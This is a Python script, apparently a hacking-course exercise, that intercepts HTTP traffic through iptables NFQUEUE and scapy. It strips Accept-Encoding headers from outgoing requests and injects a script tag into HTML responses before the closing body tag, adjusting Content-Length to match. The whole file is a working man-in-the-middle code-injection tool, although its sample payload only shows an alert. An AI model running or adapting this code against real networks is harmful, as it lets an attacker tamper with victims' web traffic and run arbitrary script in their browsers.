#!/usr/bin/env python

__author__ = "3r4th"

import subprocess
import netfilterqueue
import scapy.all as scapy
import re


def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 80:
            modified_load = re.sub("Accept-Encoding:.*?\\r\\n", "", scapy_packet[scapy.Raw].load)
            modified_packet = set_load(scapy_packet, modified_load)
            packet.set_payload(str(modified_packet))
        elif scapy_packet[scapy.TCP].sport == 80:
            modified_load = scapy_packet[scapy.Raw].load.replace("</body>", injection_code + "</body>")
            content_length_search = re.search("(?:Content-Length:\s)(\d*)", modified_load)
            if content_length_search and "text/html" in modified_load:
                content_length = content_length_search.group(1)
                new_content_length = int(content_length) + len(injection_code)
                modified_load = modified_load.replace(content_length, str(new_content_length))
            modified_packet = set_load(scapy_packet, modified_load)
            packet.set_payload(str(modified_packet))
    packet.accept()


if __name__ == "__main__":
    global injection_code
    injection_code = "<script>alert('Written by 3r4th');</script>"
    try:
        # subprocess.call("iptables -I FORWARD -j NFQUEUE --queue-num 0", shell=True)
        subprocess.call("iptables -I INPUT -j NFQUEUE --queue-num 0", shell=True)
        subprocess.call("iptables -I OUTPUT -j NFQUEUE --queue-num 0", shell=True)
        print("[+] Intercepting Requests Started ...")
        queue = netfilterqueue.NetfilterQueue()
        queue.bind(0, process_packet)
        queue.run()
    except KeyboardInterrupt:
        print("\033[1;31;49m" + "\n[-] Detected CTRL + C. flushing iptables ..." + "\033[1;37;49m")
        subprocess.call("iptables --flush", shell=True)
        print("\033[1;32;49m" + "[+] Intercepting Requests Stopped ..." + "\033[1;37;49m")
